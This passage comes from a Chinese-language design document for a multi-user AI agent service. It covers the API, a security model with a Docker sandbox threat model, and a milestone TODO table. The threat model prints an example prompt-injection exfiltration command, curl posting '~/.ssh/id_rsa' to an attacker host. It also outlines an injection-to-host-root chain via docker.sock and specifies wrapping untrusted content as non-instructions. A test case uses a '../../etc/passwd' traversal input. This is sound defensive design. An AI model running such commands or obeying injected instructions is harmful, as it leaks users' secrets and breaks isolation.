| GET | `/runs/{id}` `/runs/{id}/events?after_seq=&limit=` | trace inspector 分页读 |
| POST | `/runs/{id}/cancel` | 置 `cancel_requested`；幂等 |
| POST | `/threads/{id}/steer` | 运行中追加引导，下一个 turn 边界注入 |
| POST | `/threads/{id}/compact` | 强制压缩上下文 |
| GET | `/interrupts?status=pending` | 待办审批（前端角标） |
| POST | `/interrupts/{iid}/resolve` | `{response, scope?: once\|session}` |
| GET | `/capabilities` | **只读、用户视角**：可调用的 tools/skills/agents（名称+描述+是否需审批）；**不含**配置来源 hash、MCP command/args/env 名、hook matcher、plugin 路径 |
| GET | `/mcp/status` | **只读、已脱敏**：server 名称、连接状态、工具数、last_error（命令行与环境变量名不外泄） |
| GET | `/usage/summary` | 当前用户用量与预算余量（**无 `?user_id=` 变体**，因为没有能看别人数据的角色） |
| — | *（非 HTTP）* `python -m app.config dump\|report`、`kill -HUP <pid>`、`scripts/list_users.py` | 运维面：完整 snapshot、reload、用户与配额管理。由 shell 权限而非应用角色控制 |
| GET | `/workspaces/current` `POST /workspaces/current/reset` `GET /workspaces/current/file?path=` | 沙箱状态 + host 侧读文件（供前端渲染 diff）；reset 只清容器与临时状态，不动配置 |

SSE 细节：

- **cursor = `event_log.id`**；连接时读 `Last-Event-ID` 或 `?after=` → 先重放缺口，再进入 live fan-out（每 thread 一个 `EventHub`，多订阅者）。
- 15s `: ping` 心跳；服务端不因客户端断开而中止 run（断开 ≠ 取消，取消走 `/cancel`）。
- run 生命周期与流解耦：`POST messages` 立刻返回，允许后台跑、刷新后重新挂上流 —— 这也是 HITL 长等待的前提。
- 幂等：`client_msg_id` 唯一约束，重复提交返回同一 `run_id`。
- 响应头 `Cache-Control: no-cache`、`X-Accel-Buffering: no`（反代关闭缓冲）。

---

## 8. 安全模型

1. **认证**：`hashlib.scrypt(n, r=16, p=1, dklen=32)`，参数入库以便升级；session token `secrets.token_urlsafe(32)`，DB 存 sha256，cookie `HttpOnly; SameSite=Lax; Path=/; Secure(prod)`，滑动过期 30 天；登录限速（每 IP + 每 email）。
2. **授权**：所有 repo 查询强制带 `user_id` 谓词（`scoped_read/scoped_write` 包装，用"必须传 principal"的 API 形状防呆）。**r3 起没有 `require_admin`，也没有第二等公民端点**：唯一的权限分层是"HTTP 面（任何注册用户，只能看自己的数据与自己的能力视图）"vs"shell 面（运维：改文件、SIGHUP、CLI 脚本）"。用户之间隔离的是对话/用量/workspace，**不是能力**（能力全用户共享，ADR-015）。这条设计的可检验形式：任何返回数据的端点都不得出现别人的 id 作为查询参数 —— 除 `/capabilities` 外全部只按 principal 取数。
3. **CSRF**：非 GET 请求要求 `X-CSRF-Token` 与 cookie 中的 double-submit 值一致。**豁免 `POST /auth/login` 与 `POST /auth/register`**，否则死锁：全新浏览器无任何 cookie 时，double-submit 校验要求的 token 还没被签发过，而签发它的唯一时机（登录后）在要求它之后 → 登录页永远 403。login CSRF 危害有限（攻击者只能把受害者登进攻击者自己的账号），且 `SameSite=Lax` 已阻断跨站 POST 携带 cookie，故接受。**token 签发点**：`GET /auth/me`（前端首屏必调）与 login/register 的成功响应都会下发 `csrf_token` cookie；中间件顺序 = session 解析 → CSRF → 路由。
4. **沙箱威胁模型**：`--cap-drop ALL`、`no-new-privileges`、`--memory 2g --cpus 1 --pids-limit 256`、`--tmpfs /tmp:size=512m`、非 root `--user`、workspace 只 bind mount 该用户目录（防跨用户**文件**读）。网络按 ADR-005 三档，**缺省 `none`**（D8：容器运行期零网络 ⇒ 网关 / 同网段 / metadata / 跨用户在物理层不可达，应用层不需要再假装做过滤）。若显式放宽到另两档，**必须每用户一张独立自定义网络**，且**默认 `bridge` 禁用是硬性要求**（同网段容器互通会打破跨用户隔离）—— 两者都是 T6.4 的验收断言，不许退化。已知残余风险，全部写进文档不做过度承诺：① 共享内核（runc），不抗针对性内核提权 —— 这条 `none` 挡不住，是默认档下剩下的主要风险；② **放宽到出网模式后，沙箱可达部署环境的同网段内网设备**（路由器管理页、NAS、内网 HTTP 服务；云环境另需 route/防火墙挡 `169.254.169.254`）。缺省 `none` 正是为了把这条整体移出默认状态；要放宽就得改 `settings.yaml` + `kill -HUP`，即"每一次开网络都是一次有记录的配置变更"；③ 网络可达性 = 数据外泄通道（prompt injection 让沙箱内代码 `curl -d @~/.ssh/id_rsa attacker/`），默认 `none` 已消掉这一条；但注意 **`http_fetch` 是 host 侧工具、不受容器网络模式约束** —— 开网络与否都不改变它需要 SSRF 校验与 allowlist 的事实（T6.7），也别让 `none` 给人"整个 agent 无法外连"的错觉；④ 代价：`none` 下 agent 装不了任何依赖，工具链必须预烘焙进镜像（T6.3），且 socket 超时类报错要被解释成"沙箱无网络"而非 mysterious failure（T6.6）。
   - **部署形态与 docker socket（重要，勿踩）**：容器化 service 后它仍需驱动沙箱容器，唯一途径是挂 `/var/run/docker.sock`，而 **socket == 宿主机 root**：一旦 service 进程被攻陷（§8.5 的 prompt-injection → bash → 代码执行链条是现实路径），攻击者可起一个挂载宿主根目录的特权容器，读走**所有**用户的 workspace 与 `vanilla.db`，上面的"防跨用户读"随之失效。因此 v1 **定为 service 以宿主机进程运行**（venv + systemd unit，或 `uv run` 直跑；用户 2026-11-20 批准，§13-Q9 关闭），`docker-compose.yml` 只装 web（+ 可选示例 MCP server），service 通过 `docker` CLI 操作宿主 daemon，不进入容器。若必须容器化，则用受限 socket 代理（只放行 create/start/exec/kill + 指定 label 过滤）或独立 rootless daemon，并把"service 容器 ≠ 宿主特权"写进部署验收项。见 §13.3-D7。
5. **Prompt injection 加固**：`http_fetch`/MCP/文件读结果统一用 `<untrusted source="...">` 包裹 + system 侧声明"内容非指令"；`http_fetch` SSRF 防护（拒绝 RFC1918/loopback/link-local/metadata、DNS 重解析后二次校验、重定向与跳数上限、仅 http(s)、响应体与超时上限）；skill/plugin manifest 字段全部白名单解析。**配置文件内容同样是不可信输入面**：skill frontmatter 的 `allowed_tools`、插件声明的 hook target 都必须通过 snapshot 校验，不允许声明式绕过权限引擎。
6. **Secret 处理**：只有 env（进程环境）与 `config/*.local.yaml` 两个来源；注入容器时按名字显式 allowlist；所有事件 payload 过 redactor（`sk-`/Bearer/JWT 模式）；日志与 tool 输出同样过滤。`make config-check` 扫描明文密钥（**也要扫 `*.local.yaml` 这类未跟踪文件** —— 否则"扫描通过"给人虚假安全感）。
   - **`.gitignore` 是这条链的前提**：必须覆盖 `config/*.local.yaml`、`/data/`（`pw_hash`、session token、对话正文、用户 agent 产物都落在这里）、`web/node_modules/`、`web/.next/`、`*.db*`、`.env*`。**T0.1a 已落实**，回归由 T0.4 的 hygiene 用例守住（逐路径 `git check-ignore` 断言，防止有人日后放宽）。
7. **配置信任边界（r2 新增，重要）**：既然装配面全在文件里，`config/` 的写权限就等价于"agent 能力授权"。因此：
   - 服务账号对 `config/` **无写权限**（部署时只读挂载；`docker-compose` 里 `:ro`）。
   - 启动与 reload 时检查：`config/` 及其中任何文件 world-writable 或属主 == 服务账号 → **拒绝启动**（除非 `CONFIG_ALLOW_LOCAL=1` 的 dev 模式，且此时打印醒目告警）。
   - hook 的 command target 必须是仓库内已存在、非 world-writable、且不含 shell 元字符的可执行脚本（argv 直传，不经 shell）。
   - `CONFIG_TRUST_ON_STARTUP=1` 之类"跳过检查"的开关在文档中标红为 dev-only。
8. **插件信任**：in-process Python = 与 service 同权限 → 只有 `trusted: true`（`config/plugins.yaml` 声明、需评审）的插件可注册 callable hook / 工具。
9. **权限不可自批**：run 进程内**永不**写规则文件，`always` 档已从产品里删除；`session` 授权只进内存 TTL 表并写 `audit_log`；`once` 不留痕（除事件）。所有审批必须来自带用户身份的 resolve 请求。
10. **配额兜底（开放注册 + 全局单 key ⇒ 这一条是硬需求，不是 nice-to-have）**：
    - `per-run`：`max_turns`、wall-clock 上限、单 tool 输出字节上限。
    - `per-user`：`max_concurrent_runs`（默认 **1**）、`daily_token_budget`、注册时从 `settings.yaml` 落默认值，之后 CLI 可调。
    - **`global`：两道别人绕不过去的闸门** —— (a) `global_hourly_tokens`：账户级熔断。因为凭据只有一把（§13-D2），N 个注册用户各自不超限、加起来照样能烧穿账户；(b) `sandbox.max_live_containers`：容器数上限 + LRU 空闲回收 + 超限时 429 排队提示（不是静默丢弃）。核定原则：`max_live_containers × sandbox 单容器内存上限 ≲ 宿主可用内存的 1/3`（要给 service、web、宿主其他进程留余量）；默认取 **8**（每容器 2g ⇒ 16g），T1.5 落地时按部署环境实际资源复核并在 `config-check` 里报告越界。
11. **开放注册护栏（§13-D3 的代价，必须与注册功能同期落地）**：`POST /auth/register` 无邀请码、无首账号特权 ⇒ 攻击面从"已知用户"变成"全网"。护栏四条，缺一都不该开：(a) 注册 per-IP 限速 + per-IP 每日注册数上限（`core/ratelimit.py`，与登录桶分开）；(b) `settings.registration.open` 可一键关闭（默认 true，运维部署到公网前必须显式确认）；(c) 新账号默认 `status=active` 但预算取最保守档，异常用量（如 24h 内顶到 `daily_token_budget`）写 `audit_log` 并可在 CLI 一键 disable；(d) `/capabilities` 只回"我能用什么"，不外泄配置结构（§7）。**明确写下的残余风险**：这个服务一旦公网开放注册，实质是"任何人都能租用一台有 docker 沙箱、能出网、能花你钱的机器跑 agent"，风险接受度应由部署者决定，不是由我们的默认值替他决定 —— 所以 `registration.open` 在 `config-check` 里若为 true 且服务监听非 loopback，会打印一条 error 级提示。

---

## 9. 里程碑与 TODO

> 里程碑按序推进（M9/M10 可与 M11 交错）。每个 TODO 的"验证"是硬门槛 —— 未通过不得标记 ✅。
> 依赖：M0 → M1(配置) → M2(数据) → M3(认证) → M4(循环) → M5(流式+前端) → M6(工具+沙箱) → M7(权限) → M8(HITL) → M9(Skills) → M10(Subagents) → M11(MCP) → M12(Hooks+Plugins) → M13(硬化)

### M0 项目地基

| ID | TODO | 验证 | 状态 |
|---|---|---|---|
| T0.1a | **仓库卫生 + 版本下限**（原 T0.1 的前半，已单独批准并完成）：(a) `.gitignore` 补 `config/*.local.yaml`、`/data/`、`*.db`/`*.db-shm`/`*.db-wal`、`web/node_modules/`、`web/.next/`、`web/out/`、`web/next-env.d.ts`、`*.tsbuildinfo`、`.mypy_cache/`、`.ruff_cache/`、`.env.*`。(b) 下限收紧到实际解析版本：`openai>=3.51`（原 `>=1.55`，而 ADR-001/T4.2 的 chunk/usage 归一化按 3.51 语义验证，旧版会静默产出错误 ModelEvent）、`fastapi>=0.163`、`uvicorn[standard]>=0.54` + 注释说明"下限=实际解析版本"的约定。(c) `uv lock` | ✅ 已验证：`git check-ignore -v` 对 `data/vanilla.db`、`data/artifacts/…`、`config/settings.local.yaml`、`web/node_modules/…`、`web/.next/…`、`*.db`、`.venv`、`__pycache__` 共 8 条全部命中；`git add -A --dry-run` 首次提交仅 6 文件（无 .venv/data/db）；`uv lock` 解析不变（37 包，openai 仍 3.51.0）；`uv sync` clean | ✅ |
| T0.1b | **依赖新增**：`pydantic-settings>=2.16.3`、`pyyaml>=6.0.3`、`mcp>=2.3.0`；dev 组 `ruff>=0.17.6`/`mypy>=2.4.1`/`pytest-asyncio>=1.5.0`/`pytest-cov>=7.1.0`/`jsonschema>=4.26.0`；`uv lock && uv sync`；顺带补 `pytest-asyncio` 缺失的 `asyncio_mode`/`asyncio_default_fixture_loop_scope`（不配则每次跑测试都脏一条 deprecation warning）。**原计划"不引入 cryptography"这条验证式写错了，已按实情更正**（见 ADR-007 注） | ✅ 已验证：`uv run python -c "import mcp, yaml, pydantic_settings, jsonschema"` 通过（mcp 2.3.0）；`uv run pytest -q` 退出码 **5**（tests/ 仍空，符合预期）且**输出零 warning**；`uv lock --check` 干净；包数 37→61，`fastapi 0.163.1 / starlette 1.10.0 / pydantic 2.14.3 / openai 3.51.0 / uvicorn 0.54.0 / httpx 0.28.1 / anyio 4.16.0` 全部**未被降级**（与 T0.1a 逐一比对）。**T0.1c 已撤销**：import 级守卫在 mcp 上不可执行（见 ADR-007），该传递依赖的影响可接受，不值得单列 TODO | ✅ |
| T0.2 | `app/core/env.py`：**只放部署相关** env（`DATABASE_PATH, DATA_DIR, CONFIG_DIR, REPO_ROOT, OPENAI_API_KEY, SESSION_*, ALLOW_LOCAL_SANDBOX, CONFIG_ALLOW_LOCAL, SANDBOX_IMAGE`）+ fail-fast 校验；能力参数一律走 `config/*.yaml` | ✅ 已验证：`app/core/env.py`（pydantic-settings，10 个 env 白名单 `DEPLOY_ENV_VARS`，`load_env()` 一次性收集全部错误且不回显变量值；`@lru_cache` 单例 —— env 每进程只读一次，SIGHUP reload 只换 ConfigSnapshot 不换 EnvSettings；模型 `frozen=True`，共享实例不可被消费方改写）。`pytest tests/unit/test_env.py` **29 passed**：缺 key / 空 key 报错、缓存单例与不可变性语义（成功被 memoize、失败不入缓存、显式 clear 才重读、赋值即 ValidationError）、仅给 key 时的全套默认值、`~` 展开 + 相对路径锚定 `REPO_ROOT` + `DATABASE_PATH` 跟随 `DATA_DIR`、dev-only 开关（`1/true/yes/on` 与 `0/false/no/off` 识别、垃圾值拒绝）、`SESSION_TTL_DAYS` 边界；护栏用例钉死字段白名单 = 部署面（含"无 `SESSION_SECRET`"与"能力参数不在 env"两条否定断言）。`ruff check` / `ruff format --check` / `mypy app` 全绿。**注**：`PUBLIC_BASE_URL` 在 §11 属部署面但不在 T0.2 列表，随其消费者（M3/M5）落地时再加 | ✅ |
| T0.3 | 基础设施：`core/ids.py`(单调 UUID)、`core/clock.py`(可注入时钟)、`core/errors.py`(AppError 层级 + handler)、`core/logging.py`(结构化 JSON + request id) | 单测覆盖 id 单调性、错误码映射、日志字段 | ⬜ |
| T0.4 | `Makefile`：`lint`(ruff check+format --check, mypy app, config-check)、`test`、`dev`、`config-check`、`sandbox-build`、`gen-ts`。`test` 目标要能容忍"暂无测试"阶段（`pytest -q \|\| [ $$? -eq 5 ]`），但一旦 `tests/` 非空就必须以真实结果判定。**另加 `tests/unit/test_repo_hygiene.py`**：把 T0.1a 的 `.gitignore` 断言固化成用例（逐路径 `git check-ignore`，并断言 `/data`、`*.db`、`config/*.local.yaml`、`web/node_modules` 不可能被跟踪；**同时钉死 `.env.example` 可跟踪而 `.env`/`.env.local` 被忽略**——`.gitignore` 里的 `!.env.example` 反选防止将来"顺手放宽"被反向误删），防止将来有人"顺手"放宽 | `make lint` 全绿；`make test` 在空 `tests/` 下退出 0；手动放一个失败用例后 `make test` 退出非 0；故意改坏 `.gitignore` 时 hygiene 用例失败 | ⬜ |
| T0.5 | `docs/architecture.md`：抽取 §3/§4/§7/§8 的稳定描述（契约、协议、不变量、配置面） | 人工评审 | ⬜ |

### M1 配置层（config-as-code，ADR-015 落地）

| ID | TODO | 验证 | 状态 |
|---|---|---|---|
| T1.1 | `app/config/schema.py`：`Settings/ToolConfig/PermissionsConfig/HookConfig/MCPConfig/PluginsConfig` 的 pydantic 模型（strict、`extra="forbid"`），以及共享的 skill/agent frontmatter 模型 | 单测：未知字段报错、类型/枚举校验、必填缺失报错清晰 | ⬜ |
| T1.2 | `app/config/loader.py`：读 `config/*.yaml`、`${env:VAR}` 展开（禁止 `${file:}`）、路径相对 `REPO_ROOT` 解析 + 禁止越出 `config/`、**收集式校验**（`ConfigIssue` 一次报全，不 fail-fast 于第一条） | 单测：缺 env 变量、越界路径、语法错、多问题一次性列出；fixture 目录覆盖 | ⬜ |
| T1.3 | `app/config/snapshot.py`：`ConfigSnapshot`（version/sources sha256/合并后视图）+ `ConfigStore.swap()` 原子替换 + `RunContext.config` 引用旧快照语义 | 单测：reload 前后两个 run 各持自己快照；swap 失败保留旧快照；version 单调 | ⬜ |
| T1.4 | 合并规则：`plugins/<name>` 资源贡献、`*.local.yaml` 覆盖门控、permission 并集 + deny 优先 + 插件禁声明 bypass、**同名冲突报 error**（skill slug / tool name / mcp server / hook matcher） | 单测：4 类冲突各报一条 error；local 覆盖在未开开关时被忽略 | ⬜ |
| T1.5 | `config/` 初版：最小可用一套（`settings.yaml`：默认 model/provider 三字段 + sandbox 限额与 **`network_mode: none` 缺省** + `registration.open: true` + 预算默认值；`tools.yaml` 关 bash 之外的写类工具；`permissions.yaml` 3 条示例规则；`hooks.yaml`/`mcp.yaml`/`plugins.yaml` 空清单）+ 1 个示例 skill + 1 个示例 agent + `config/README.md` | `make config-check` 通过；快照能列出预期 tools/skills/agents 数；**缺省快照里 `network_mode == "none"` 且 `registration.open=true` 时 config-check 对非 loopback 监听报 error**（§8.11 那条要在初版就可见，不是等 T13 才发现） | ⬜ |
| T1.6 | `make config-check` + `python -m app.config check\|dump`（dump 打印合并后的完整能力视图供评审）；`check` 含**明文密钥扫描**与"引用了不存在的工具/server/plugin"检查 | CI 式脚本：故意引用不存在工具 → 非零退出；故意放一个 `sk-` → error | ⬜ |
| T1.7 | 配置信任边界检查（§8.7）：`config/` 属主/可写性、hook 脚本 world-writable、`CONFIG_ALLOW_LOCAL` 告警；启动与 reload 都执行 | 单测：用 `os.chmod`/tmpdir 构造可写目录 → 拒绝；dev 开关下仅告警 | ⬜ |
| T1.8 | 装配面的两个出口：(a) **运维 CLI** `python -m app.config dump\|report`（合并后视图 + 来源 sha256 + issues）；(b) **用户侧只读 API** `GET /capabilities`（tools/skills/agents 名称+描述+是否需审批）与 `GET /mcp/status`（脱敏：不含 command/args/env 名）。**reload = SIGHUP 处理器**（无 HTTP 端点）；`/config/report`、`/plugins`、`/admin/*` 一律不实现 | 单测：dump 输出含 sources sha256；`/capabilities` 响应体 grep 不到 `command`/`env`/`.yaml` 路径；`kill -HUP` 后 snapshot version 递增；在跑的 run 快照版本不变；`grep -rn 'require_admin\|/admin/' app/` 无命中 | ⬜ |

### M2 数据层（仅运行时事实）

| ID | TODO | 验证 | 状态 |
|---|---|---|---|
| T2.1 | `db/sqlite.py`：连接工厂（WAL/busy_timeout/foreign_keys）、写单线程 executor + 读并发、事务上下文管理器 | 并发写 200 行无 `database is locked`；临时文件库 | ⬜ |
| T2.2 | `db/migrate.py` + `migrations/0001_init.sql`：**14 张表**（§6，无 registry 类表、无 permission_rule/skill/mcp/plugin/hook/secret/settings）；schema_version、幂等、lifespan 钩子 | 单测：空库→v1、重复执行无副作用、缺文件报错清晰 | ⬜ |
| T2.3 | `event_log` repo：`append` → `(cursor, seq)`、`replay(thread, after_cursor, limit)`、delta 批量合并写入（每 N 个或 200ms） | 单测：seq 连续、跨 run 全局 id 单调、replay 无缺无重、批量后仍保序 | ⬜ |
| T2.4 | repos：`thread/message/message_part/run/tool_call/usage`（全部带 `user_id` 谓词）+ `compaction` | 集成：建 thread→写消息→跑 run→读回顺序一致；越权读返回空 | ⬜ |
| T2.5 | `artifact` 存储：sha256 去重、`artifacts/<sha[0:2]>/<sha>` 落盘、大小上限、binary/media 判定 | 单测：重复写命中同一 id、超限拒绝、并发写不损坏 | ⬜ |
| T2.6 | `audit_log` repo + 事件类型枚举（login/logout/session_grant/approve/deny/reload/config_check_failed） | 单测：写入与按用户过滤读；无 HTTP 写入路径 | ⬜ |

### M3 认证与多用户

| ID | TODO | 验证 | 状态 |
|---|---|---|---|
| T3.1 | `auth/passwords.py`：scrypt 哈希/校验（参数记录、constant-time 比较） | 单测：正/误口令、参数升级路径、哈希不含明文 | ⬜ |
| T3.2 | `auth/sessions.py` + `auth/deps.py`：登录签发 cookie、滑动过期、logout 吊销、`status=disabled` 账号在 session 解析阶段即拒（不只是登录时）、`/auth/*` 路由。**不实现 `require_admin`**（无 admin 角色，ADR-004） | e2e：登录→me→logout→me 401；过期 cookie 被拒；注册后被 disable → 已存在的 session 立即失效 | ⬜ |
| T3.3 | **开放注册**（`POST /auth/register`，无邀请码、无首账号特权、`status` 与配额取自 `settings.yaml` 默认）+ 运维 CLI：`scripts/set_user_quota.py`、`scripts/disable_user.py`、`scripts/list_users.py`（配额与禁用只能走 CLI，替代原 admin 端点） | 单测：注册→立即登录可用；`registration.open=false` 时 403；per-IP 超限 429；CLI 脚本改配额/禁用生效且写 `audit_log` | ⬜ |
| T3.4 | CSRF double-submit（**豁免 login/register**，见 §8.3）+ token 签发点（`GET /auth/me` 与登录/注册成功响应）+ 安全 cookie 属性 + **两套独立限速桶**：登录（IP+email，防口令猜测）与注册（IP，per-hour + per-day，防批量开号，§8.11） | 测试：全新无 cookie 客户端 `POST /auth/login` 与 `POST /auth/register` 均成功（不被 CSRF 挡住）；登录后 `POST /threads/{id}/messages` 带 token 成功、缺 token 403；`POST /auth/password` 无 session 401（豁免白名单不覆盖它）；登录连续 5 次失败锁定；注册超 per-IP 每日上限返回 429 且不落库 | ⬜ |
| T3.5 | `workspace/paths.py`：每用户 `data/workspaces/<user_id>/`、realpath 约束、`O_NOFOLLOW` 写入、symlink 越界拒绝 | 单测：`../../etc/passwd` 被拒、workspace 内正常、symlink 逃逸被拒 | ⬜ |

### M4 模型层与 agent 主循环（无工具）

| ID | TODO | 验证 | 状态 |
|---|---|---|---|
| T4.1 | `agent/model.py`：`ModelClient` protocol + `ModelEvent/ModelRequest` DTO + `ScriptedModelClient`（注入 delta/错误/取消） | 单测：脚本回放顺序、Stop 语义 | ⬜ |
| T4.2 | `agent/openai_client.py`：`AsyncOpenAI(base_url=)` → `chat.completions.create(stream=True)`，chunk 归一化为 `ModelEvent`（含 usage、`finish_reason`、tool_call 参数增量拼接、httpx 超时与重试、取消传播） | 单测用录制 chunk fixture 断言归一化；真实调用仅在 `VANILLA_RUN_LIVE=1` | ⬜ |
| T4.3 | `agent/context.py`：ContextBuilder **从 `ConfigSnapshot` 取料**（agent persona + 环境信息 + tool catalog 摘要 + skills 索引 + 历史渲染 + chars/4 token 估算），`settings.yaml` 提供 model/温度/max_turns | 单测：system prompt 随 snapshot 变化；token 估算单调；未启用工具不出现在 catalog | ⬜ |
| T4.4 | `agent/loop.py`（纯函数式 + 依赖注入）：turn 循环、`max_turns`、错误分类、`RunStatus` 迁移、事件产出、`run.config_version` 落库 | ScriptedModelClient 驱动：单轮/多轮/超轮/模型错误 四条用例 | ⬜ |
| T4.5 | `agent/runner.py`：RunManager（进程内 task 监督、`cancel_requested`、崩溃→`RUN_FAILED`、重启回收悬挂 run） | 集成：启动→cancel→终态正确；模拟重启后悬挂 run 被标记 | ⬜ |

### M5 SSE 运行时 + 前端骨架（端到端聊天）

| ID | TODO | 验证 | 状态 |
|---|---|---|---|
| T5.1 | `agent/sse.py`：EventHub（thread 级 fan-out）、SSE 编码、心跳、`Last-Event-ID` 重放、慢客户端丢弃策略（不阻塞 run） | 集成：断线→重连→无缺失（对比 `event_log`） | ⬜ |
| T5.2 | API：`/threads`、`/threads/{id}/messages`(202+run_id)、`/threads/{id}/stream`、`/runs/{id}(/events)`、`/runs/{id}/cancel`、`client_msg_id` 幂等 | e2e：POST→读流→终态；重复 `client_msg_id` 同一 run | ⬜ |
| T5.3 | TS 类型生成：`scripts/gen_typescript.py`（pydantic JSON Schema → json-schema-to-typescript）+ `make gen-ts` + 漂移即失败 | `make gen-ts && git diff --exit-code` | ⬜ |
| T5.4 | `web/` 脚手架：Next.js(App Router)+TS+Tailwind、`lib/api.ts`(CSRF/session)、登录页、`lib/sse.ts` 自解帧、`lib/reduce.ts`(事件→UI state，按 `(run_id,seq)` 去重)、聊天面板流式渲染 | `npm run build`；reducer 有 vitest；浏览器登录+流式对话可用 | ⬜ |
| T5.5 | thread 列表/切换/标题、markdown + 代码块渲染、错误态与重连提示；`/capabilities` 侧栏（我能调用哪些 tools/skills/agents + 是否需要审批；**不显示** config version、来源 hash、MCP 命令行 —— §7 的脱敏口径要在前端也成立，别自己拼出来）+ 注册页（`/auth/register`，开放注册） | 手动 + vitest 渲染用例；断言侧栏 DOM 里不含 `.yaml` 路径与 sha256 串 | ⬜ |

### M6 工具系统 + Docker 沙箱

| ID | TODO | 验证 | 状态 |
|---|---|---|---|
| T6.1 | `tools/base.py`+`registry.py`：注册表**由 snapshot 构建**（内置工具 `enabled` 位 + timeout/大小按 `tools.yaml` 收紧，硬上限不可被配置突破）、args 校验、namespace 冲突检测 | 单测：禁用工具不进 catalog；超限配置被钳制并 warning；非法 schema 报错 | ⬜ |
| T6.2 | `tools/dispatcher.py`：`concurrency_safe` 并行 + 写类串行、per-tool 超时、结果 spill/artifact、`tool_call` 行写入 | 单测：并行 safe 总耗时≈max；unsafe 串行；超时→TOOL_CALL_FAILED | ⬜ |
| T6.3 | `sandbox/base.py` + `FakeSandbox` + `config sandbox` 限额消费 + 镜像 `sandbox/image/Dockerfile` + `make sandbox-build`。**默认 `network_mode: none`（D8）⇒ 镜像必须自带 agent 真会用的全部工具链**：coreutils/git/rg/jq/find/python3 + 一组常用包（requests/httpx、pandas? 由 §1.2 范围决定，宁缺勿滥、写清单进 `docs/sandbox.md`），因为运行期装不了任何东西；镜像内保留 `--index-url` 参数化以便将来开网络时复用。镜像版本与 `settings.sandbox.image_tag` 绑定，加依赖 = 改 Dockerfile + rebuild（配置级动作，非运行时）。**部署环境的出网能力差异很大**（公共 registry 与默认 PyPI 在不少环境不可达，需 registry mirror / 包索引代理）⇒ Dockerfile 里的 apt/pip 源与基础镜像 tag 都要可从 `settings.yaml`（`apt_mirror`/`pip_index_url`/`base_image`）注入并参数化覆盖；构建失败要给出"哪个源不可达"的清晰错误，不要只抛 docker 退出码 | FakeSandbox 单测；`@pytest.mark.docker`：build+exec 回显；**断网构建路径**：把 mirror URL 指向不可达主机时，构建报错能指名失败的源；**无网可用路径**：默认 `none` 档下，镜像自带的工具链必须能跑通全部内置工具（任何步骤依赖运行期联网都算缺陷） | ⬜ |
| T6.4 | `sandbox/docker.py`：`ensure`(复用/创建：label、cap-drop、no-new-privileges、限额、tmpfs、非 root user、**`--network` 按 `settings.sandbox.network_mode` 取 `none`（**默认**，此时不创建任何网络）\| `internal` \| `per_user_bridge`**；后两档才建每用户一张自定义网络 `va-net-<user_hash>` 并与容器同生命周期创建/销毁)、`exec`(argv 直传、env allowlist、超时 kill)、`release`、lifespan `reconcile`(**孤儿容器 + 孤儿网络**清理 + idle TTL + `max_live_containers` 计数与 LRU)。**禁止使用默认 `bridge`**（同网段互通会打破跨用户隔离，ADR-005） | docker 测试：容器复用命中、超时 kill、跨用户**文件**不可见、重启对账同一容器；**网络三条硬断言**（设计前提，回归不许退化）：① 用户 B 容器连用户 A 容器 IP 不可达；② `network_mode: internal` 下容器出网失败；③ `none` 下连网关都连不到 | ⬜ |
| T6.5 | `builtin/fs.py`：read_file(offset/limit/行号)、write_file、edit_file(str_replace 精确+唯一性)、delete/move（仅 workspace 内 + 默认 ask）；host 侧 realpath | 单测：diff 正确、str_replace 不唯一拒绝、越界拒绝、二进制/编码检测 | ⬜ |
| T6.6 | `builtin/search.py`(glob/grep 沙箱内 fd/rg，输出限量) + `builtin/shell.py`(bash：默认 ask、cwd 持久、env 净化、硬超时)。**默认 `none` 档下必须把网络类失败翻译成人话**：捕获 `ENETUNREACH`/`EHOSTUNREACH`/`EAI_AGAIN`/DNS 解析失败，在 tool result 里明确"沙箱无网络（`network_mode: none`）；需要网络请改 `config/settings.yaml` 并 `kill -HUP <pid>`"，而不是把裸 traceback 丢给模型让它瞎猜下一步 | FakeSandbox argv 断言 + docker e2e：`git status` 类命令；**网络失败翻译用例**：默认档下容器内 `python -c "urllib.request.urlopen('https://example.com')"` → tool result 含上述指引且不含裸 traceback | ⬜ |
| T6.7 | `builtin/net.py`：`http_fetch`（host 侧、SSRF 校验、**域名 allowlist 来自 `tools.yaml`**、大小/重定向/超时、HTML→文本粗提取）。注意这是 **host 侧**工具，其 allowlist 是沙箱网络放开后我们仅剩的应用层控制点；`settings.sandbox.network_mode=per_user_bridge` 时容器内 `curl` 不受此 allowlist 约束（只能靠 §8.4 的部署前提兜底），这个不对称要写进 `docs/`（不能让文档暗示"http_fetch 有 allowlist ⇒ 出网受控"） | 单测：私有地址/元数据 IP/非 http scheme/allowlist 外域名被拒；本地 fixture 正常抓取；docker e2e：容器内可直连白名单外主机（记录为**已知不对称**，非缺陷） | ⬜ |
| T6.8 | loop 接入 tools：`TOOL_CALL_*` 事件（args 增量→完成→结果）、tool message 回灌、失败分类 | e2e：ScriptedModelClient 发一次 `read_file` → 前端出现工具卡片与结果 | ⬜ |

### M7 权限引擎（读配置，不写配置）

| ID | TODO | 验证 | 状态 |
|---|---|---|---|
| T7.1 | `permissions/types.py` + `rules.py`：pattern grammar（`ToolName`、`ToolName(prefix*)`、`mcp__srv__*`）、匹配器、**deny > ask > allow**（效果优先，不看特异性） | 表驱动单测（通配、命名空间、无前缀全匹配、冲突效果） | ⬜ |
| T7.2 | `permissions/modes.py`：`default/plan/acceptEdits/bypass` preset 与 tool 属性合成默认决策；`policy.disallow_bypass` 生效；plan 模式下写类工具强制 deny | 单测：mode × tool-kind 决策矩阵；disallow_bypass 时 snapshot 里的 bypass 请求被拒 | ⬜ |
| T7.3 | `permissions/engine.py`：以 snapshot.rules 为唯一规则源；`PermissionResult` 带 `rule_source(file:line)` + `reason` + `suggested_rule_yaml`；结果写进 `tool_call` | 集成：allow/ask/deny 三路径；用户隔离（同一规则对所有用户一致，跨 thread 不串） | ⬜ |
| T7.4 | `permissions/grants.py`：进程内 `SessionGrantStore`（key = user+thread+pattern，TTL 默认 = 进程/快照存活期），命中即免询问；**不落库、不提供写规则端点** | 单测：grant 后同类免问；重启/reload 后失效；无 HTTP 写路径（grep 端点清单） | ⬜ |
| T7.5 | `suggested_rule_yaml` 生成：把"我刚想允许 `bash(git *)`"渲染成可提交到 `config/permissions.yaml` 的片段（含 note 字段），仅作为文本回给前端 | 单测：生成片段可被 `loader` 解析回等价规则 | ⬜ |

### M8 中断与 human-in-the-loop

| ID | TODO | 验证 | 状态 |
|---|---|---|---|
